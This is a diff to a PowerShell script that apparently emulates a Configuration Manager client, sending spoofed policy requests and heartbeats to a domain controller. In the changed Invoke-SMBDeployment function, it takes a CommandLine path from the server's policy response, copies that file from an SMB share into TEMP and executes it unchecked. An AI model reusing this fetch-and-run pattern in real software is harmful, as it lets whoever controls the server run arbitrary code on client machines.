@@ -231,7 +231,7 @@ function Send-LocationRequest {
 }
 
 function Send-PolicyRequest {
-    param([string]$DC)
+    param([string]$DC, [switch]$ReturnContent)
     
     $protocol = if ($UseHTTPS) { "https" } else { "http" }
     $port = if ($UseHTTPS) { $HTTPSPort } else { $HTTPPort }
@@ -252,6 +252,9 @@ function Send-PolicyRequest {
     $result = Invoke-SCCMRequest -Method "POST" -Url $url -Body $body
     if ($result.StatusCode -eq 200) {
         Write-Log "Policy request sent to $url - Response: $($result.StatusCode)"
+        if ($ReturnContent -and $result.Content) {
+            return $result.Content
+        }
         return $true
     } else {
         Write-ErrorLog "Policy request failed to $url`: $($result.StatusDescription)"
@@ -366,77 +369,46 @@ function Send-Heartbeat {
 }
 
 function Invoke-SMBDeployment {
-    param([string]$DC)
+    param([string]$Content)
     
-    if (-not $AutoDeploy) {
+    if (-not $Content) {
         return $false
     }
     
-    $protocol = if ($UseHTTPS) { "https" } else { "http" }
-    $port = if ($UseHTTPS) { $HTTPSPort } else { $HTTPPort }
-    $url = "$protocol://$DC`:$port/ccm_system/request"
-    
-    $body = @"
-<CCM_MethodInvocation xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009">
-    <MethodName>GetPolicy</MethodName>
-    <Parameters>
-        <Parameter>
-            <Name>PolicyType</Name>
-            <Value>1</Value>
-        </Parameter>
-    </Parameters>
-</CCM_MethodInvocation
-"@
-    
     try {
-        Write-Log "Requesting deployment policy..."
-        
-        $defaultHeaders = @{
-            "User-Agent" = "SMS CCM/5.00"
-            "Accept" = "*/*"
-            "X-Machine-Name" = $env:COMPUTERNAME
-            "Content-Type" = "application/xml; charset=utf-8"
-        }
-        
-        $response = Invoke-WebRequest -Uri $url -Method POST -Body $body -Headers $defaultHeaders -UseBasicParsing -ErrorAction Stop -TimeoutSec 15
-        
-        if ($response.StatusCode -eq 200 -and $response.Content) {
-            $content = $response.Content
+        if ($Content -match '<CommandLine>([^<]+)</CommandLine>') {
+            $sMBPath = $matches[1].Trim()
+            Write-Log "Policy received - SMB deployment: $sMBPath"
             
-            if ($content -match '<CommandLine>([^<]+)</CommandLine>') {
-                $sMBPath = $matches[1].Trim()
-                Write-Log "Policy received - SMB deployment: $sMBPath"
+            if ($sMBPath -match '\\\\([^\\]+)\\([^\\]+)\\(.+)') {
+                $server = $matches[1]
+                $share = $matches[2]
+                $fileName = $matches[3]
                 
-                if ($sMBPath -match '\\\\([^\\]+)\\([^\\]+)\\(.+)') {
-                    $server = $matches[1]
-                    $share = $matches[2]
-                    $fileName = $matches[3]
+                Write-Log "Downloading from \\$server\$share..."
+                
+                $localPath = Join-Path $env:TEMP $fileName
+                
+                try {
+                    Copy-Item -Path $sMBPath -Destination $localPath -Force -ErrorAction Stop
+                    Write-Log "Downloaded to: $localPath"
                     
-                    Write-Log "Downloading from \\$server\$share..."
+                    Write-Log "Executing: $localPath"
+                    $process = Start-Process -FilePath $localPath -NoNewWindow -PassThru -ErrorAction Stop
                     
-                    $localPath = Join-Path $env:TEMP $fileName
-                    
-                    try {
-                        Copy-Item -Path $sMBPath -Destination $localPath -Force -ErrorAction Stop
-                        Write-Log "Downloaded to: $localPath"
-                        
-                        Write-Log "Executing: $localPath"
-                        $process = Start-Process -FilePath $localPath -NoNewWindow -PassThru -ErrorAction Stop
-                        
-                        Write-Log "Deployment executed successfully (PID: $($process.Id))"
-                        return $true
-                    } catch {
-                        Write-ErrorLog "Failed to download/execute: $($_.Exception.Message)"
-                        return $false
-                    }
+                    Write-Log "Deployment executed successfully (PID: $($process.Id))"
+                    return $true
+                } catch {
+                    Write-ErrorLog "Failed to download/execute: $($_.Exception.Message)"
+                    return $false
                 }
-            } else {
-                Write-VerboseLog "No deployment command in policy"
-                return $false
             }
+        } else {
+            Write-VerboseLog "No deployment command in policy"
+            return $false
         }
     } catch {
-        Write-ErrorLog "Deployment policy request failed: $($_.Exception.Message)"
+        Write-ErrorLog "Deployment parse failed: $($_.Exception.Message)"
         return $false
     }
     
@@ -488,13 +460,20 @@ try {
         
         # Policy Request
         if (($now - $timers.PolicyRequest).TotalSeconds -ge $Intervals.PolicyRequest) {
-            if (Send-PolicyRequest -DC $DC) {
+            $policyContent = $null
+            if ($AutoDeploy) {
+                $policyContent = Send-PolicyRequest -DC $DC -ReturnContent
+            } else {
+                $policyResult = Send-PolicyRequest -DC $DC
+            }
+            
+            if ($policyContent -or $policyResult) {
                 $timers.PolicyRequest = $now
                 $anyActivity = $true
             }
             
-            if ($AutoDeploy) {
-                Invoke-SMBDeployment -DC $DC
+            if ($AutoDeploy -and $policyContent) {
+                Invoke-SMBDeployment -Content $policyContent
             }
         }
         
